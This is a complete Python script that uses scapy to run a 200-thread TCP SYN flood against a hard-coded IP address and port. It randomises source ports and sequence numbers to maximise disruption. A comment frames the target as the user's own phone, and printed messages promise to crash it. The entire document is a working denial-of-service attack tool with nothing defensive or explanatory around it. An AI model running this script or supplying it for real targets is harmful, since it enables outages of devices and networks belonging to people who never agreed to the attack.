from scapy.all import *
import threading
import random
import time

# Target details
TARGET_IP = "192.168.164.198"  # Replace with your phone's IP
TARGET_PORT = 8080
THREAD_COUNT = 200  # Aggressive thread count
PACKETS_PER_SECOND = 5000  # High packet rate per thread

def syn_flood():
    while True:
        # Randomize source port and sequence for chaos
        src_port = random.randint(1024, 65535)
        seq = random.randint(0, 0xFFFFFFFF)
        ip = IP(dst=TARGET_IP, ttl=random.randint(32, 128))
        tcp = TCP(sport=src_port, dport=TARGET_PORT, flags="S", seq=seq)
        packet = ip / tcp
        send(packet, verbose=0, inter=1.0/PACKETS_PER_SECOND)  # Control rate

# Launch the flood
print(f"Launching BRUTAL SYN flood on {TARGET_IP}:{TARGET_PORT}...")
threads = []
for _ in range(THREAD_COUNT):
    t = threading.Thread(target=syn_flood)
    t.daemon = True
    t.start()
    threads.append(t)

print("Flood running... Press Ctrl+C to stop. Expect your phone to crash!")
try:
    while True:
        time.sleep(1)  # Keep main thread alive
except KeyboardInterrupt:
    print("Stopping flood...")